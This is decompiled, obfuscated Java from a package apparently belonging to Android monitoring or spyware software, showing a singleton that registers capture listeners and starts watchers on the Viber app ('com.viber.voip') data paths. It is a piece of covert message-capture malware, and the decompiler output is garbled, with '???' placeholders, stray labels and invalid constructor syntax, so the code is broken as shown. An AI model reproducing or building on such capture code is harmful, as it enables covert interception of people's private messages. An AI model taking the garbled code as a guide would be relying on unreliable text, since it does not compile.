package com.vvt.capture.viber.mode.a;

import com.vvt.base.capture.i;
import com.vvt.n.a.b;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;

public class c
  implements com.vvt.n.a.a
{
  private static final boolean a = com.vvt.ak.a.e;
  private static final boolean b = com.vvt.ak.a.a;
  private static c d;
  private b c;
  private boolean e = false;
  private HashSet f;
  
  private c()
  {
    HashSet localHashSet = new java/util/HashSet;
    localHashSet.<init>();
    this.f = localHashSet;
  }
  
  public static c a()
  {
    synchronized (c.class)
    {
      c localc = d;
      if (localc == null)
      {
        localc = new com/vvt/capture/viber/mode/a/c;
        localc.<init>();
        d = localc;
      }
      localc = d;
      return localc;
    }
  }
  
  public void a(i parami)
  {
    boolean bool = b;
    if (bool) {}
    synchronized (this.f)
    {
      Object localObject2 = this.f;
      bool = ((HashSet)localObject2).contains(parami);
      if (!bool)
      {
        localObject2 = this.f;
        ((HashSet)localObject2).add(parami);
      }
      bool = this.e;
      if (bool) {
        break label143;
      }
      bool = true;
      this.e = bool;
      localObject2 = this.c;
      if (localObject2 != null)
      {
        localObject2 = com.vvt.capture.viber.mode.full.c.b();
        ??? = ((List)localObject2).iterator();
        bool = ((Iterator)???).hasNext();
        if (!bool) {
          break label143;
        }
        localObject2 = (String)((Iterator)???).next();
        b localb = this.c;
        localb.a((String)localObject2, this);
      }
    }
    bool = a;
    if (bool) {}
    label143:
    bool = b;
    if (bool) {}
  }
  
  public void a(b paramb)
  {
    this.c = paramb;
  }
  
  public void a(String paramString)
  {
    boolean bool = b;
    if (bool) {}
    synchronized (this.f)
    {
      Object localObject1 = this.f;
      Iterator localIterator = ((HashSet)localObject1).iterator();
      bool = localIterator.hasNext();
      if (bool)
      {
        localObject1 = localIterator.next();
        localObject1 = (i)localObject1;
        ((i)localObject1).a();
      }
    }
    bool = b;
    if (bool) {}
  }
  
  public void b(i parami)
  {
    boolean bool1 = b;
    if (bool1) {}
    synchronized (this.f)
    {
      Object localObject2 = this.f;
      bool1 = ((HashSet)localObject2).contains(parami);
      if (bool1)
      {
        localObject2 = this.f;
        ((HashSet)localObject2).remove(parami);
      }
      localObject2 = this.f;
      int i = ((HashSet)localObject2).size();
      boolean bool3 = b;
      if ((!bool3) || (i == 0))
      {
        bool2 = this.e;
        if (bool2)
        {
          bool2 = false;
          this.e = false;
          localObject2 = this.c;
          if (localObject2 != null)
          {
            localObject2 = com.vvt.capture.viber.mode.full.c.b();
            ??? = ((List)localObject2).iterator();
            bool2 = ((Iterator)???).hasNext();
            if (bool2)
            {
              localObject2 = (String)((Iterator)???).next();
              b localb = this.c;
              localb.a((String)localObject2);
            }
          }
        }
      }
    }
    boolean bool2 = b;
    if (bool2) {}
  }
  
  public void c(String paramString)
  {
    boolean bool = b;
    if (bool) {}
    Object localObject = this.f;
    Iterator localIterator = ((HashSet)localObject).iterator();
    for (;;)
    {
      bool = localIterator.hasNext();
      if (!bool) {
        break;
      }
      localObject = (i)localIterator.next();
      String str = "com.viber.voip";
      ((i)localObject).a(str, paramString);
    }
    bool = b;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/viber/mode/a/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */